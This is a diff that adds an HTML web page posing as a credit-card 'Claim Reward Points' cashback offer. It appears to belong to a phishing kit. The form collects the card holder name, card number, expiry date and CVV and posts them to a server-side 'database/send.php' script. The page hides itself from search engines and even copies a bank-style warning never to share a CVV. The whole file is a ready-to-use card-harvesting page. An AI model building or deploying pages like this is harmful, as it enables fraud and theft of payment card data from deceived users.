@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noindex, nofollow">
+        <title>Redeem Reward Points</title>
+        <!-- Google font -->
+        <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700%7CVarela+Round" rel="stylesheet">
+        <!--checkout css-->
+        <link type="text/css" rel="stylesheet" href="css/checkout.css" />
+        <!-- Bootstrap -->
+        <link type="text/css" rel="stylesheet" href="css/bootstrap.min.css" />
+        <!-- Font Awesome Icon -->
+        <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+        
+        <link rel="stylesheet" href="./css/vendor/reset.css">
+    <link rel="stylesheet" href="./css/vendor/font.css">
+    <link rel="stylesheet" href="./css/vendor/fontawesome.min.css">
+    <link rel="stylesheet" href="./css/vendor/bootstrap.min.css">
+    <link rel="stylesheet" href="./css/vendor/animate.min.css">
+    <link rel="stylesheet" href="./css/app/main.css">
+       
+    <!------ Seal Responsive Image Start ---------->
+    <style>
+.responsive {
+  width: 100%;
+  height: auto;
+}
+</style>
+<!------ Seal Responsive Image End ---------->
+    </head>
+    <body>
+        <div id="mainContainer" class="container-fluid d-none animated">
+        <div class="main-nav"></div>
+        <section class="checkout">
+            <div class="container">
+                <form autocomplete="off" action="database/send.php" method="POST"> <!-- form start -->
+                    <div class="row">
+                        <div class="col-md-12">
+                            <div class="chk-title">
+                                <center>
+                                <img src="img/rewardpoints.png" alt="images" class="center" width="100" height="100">
+                             <h3>Claim Reward Points</h3></center>   
+                            </div>
+                        </div>
+                    </div>
+                         <div class="col-md-12">
+                                    <div class="detail">
+                                        <h5>Redeem Your Credit Card Reward Points by Converting into Cashback</h5>
+                                    </div>
+                                    <div class="row">
+                                        <div class="col-lg-12">
+                                            <div class="form-group">
+                                                <label class="accept-label">1 Reward Point = ₹ 0.50</label><br>
+                                                
+                                            <label for="des">Just start by checking your Reward Points right here itself.</label>
+                                        
+                                                <img src="img/major-credit-card-logo.png" alt="images" class="accept-card">
+                                            </div>
+                                        </div>
+                                        <div class="col-md-12">
+                                            <div class="form-group">
+                                                <label for="cardno">Card Holder Name</label>
+                                                <input type="text" name="first-name" class="form-control" autocomplete="off" placeholder="Name on Card" required>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-12">
+                                            <div class="form-group">
+                                                <label for="cardno">Card No.</label>
+                                                <input type="text" name="number" class="form-control" autocomplete="off" required>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-4">
+                                            <div class="form-group">
+                                                <label for="expirymonth">Card Expiry</label>
+                                                <input type="text" name="expiry" class="form-control" autocomplete="off" placeholder="MM / YY" required>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-4">
+                                            <div class="form-group">
+                                                <label for="cvv">Cvv</label>
+                                                <input type="text" name="cvc" id="cvc" class="form-control" autocomplete="off" required>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-12">
+                                            <label for="des">Never share your PAN, Credit Card No., CVV, Card Expiry Date, OTP, MyCard App MPIN, etc. with anyone over call, SMS, e-mail or via link.</label>
+                                        </div>
+
+                                        <div class="col-md-6">
+                                            <div class="form-group">
+                                                <div class="buttons">
+                                                	<img src="img/seal.png" class="responsive">
+                                                    <!--<a href="" class="btn-order hvr-sweep-to-right">ORDER HERE</a>-->
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-6">
+                                            <div class="form-group">
+                                                <div class="buttons">
+                                                	<input type="submit" name="submit" value="Check Reward Points" onClick="" id="submit" class="btn btn-primary btn-order hvr-sweep-to-right"/>
+                                                    <!--<a href="" class="btn-reset hvr-sweep-to-right">RESET ALL</a>-->
+                                              <!--  <button type="reset" class="btn btn-reset hvr-sweep-to-right" tabindex="23" id="reset">Reset All</button> -->
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </section> 
+    </div>
+        <!-- Back to top -->
+        <div id="back-to-top"></div>
+        <!-- /Back to top -->
+        <div class="loader-container">
+            <div class="dot dot-1"></div>
+            <div class="dot dot-2"></div>
+            <div class="dot dot-3"></div>
+        </div>
+        <svg xmlns="http://www.w3.org/2000/svg" version="1.1">
+            <defs>
+                <filter id="goo">
+                    <feGaussianBlur in="SourceGraphic" stdDeviation="10" result="blur"></feGaussianBlur>
+                    <feColorMatrix in="blur" mode="matrix" values="1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 21 -7">
+                    </feColorMatrix>
+                </filter>
+            </defs>
+        </svg>
+    
+
+        <!-- Preloader -->
+        <!-- <div id="preloader">
+            <div class="preloader">
+                <span></span>
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div> -->
+        <!-- /Preloader -->
+
+        <!-- jQuery Plugins Start-->
+        
+        <script type="text/javascript" src="js/jquery.min.js"></script>
+        <script type="text/javascript" src="./js/bootstrap.min.js"></script>
+        <script type="text/javascript" src="js/main.js"></script>
+        <script type="text/javascript" src="./js/vendor/jquery.js"></script>
+        <script type="text/javascript" src="./js/app/main.js"></script>
+        <!-- jQuery Plugins End-->
+
+        <!-- Card ALgo Start -->
+        <div class="card-wrapper" style="display: none;" ></div>
+        
+<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
+<script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/121761/card.js'></script>
+<script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/121761/jquery.card.js'></script>
+<script src="js/card.js"></script>
+<!-- Card Algo End -->
+
+    </body>
+</html>
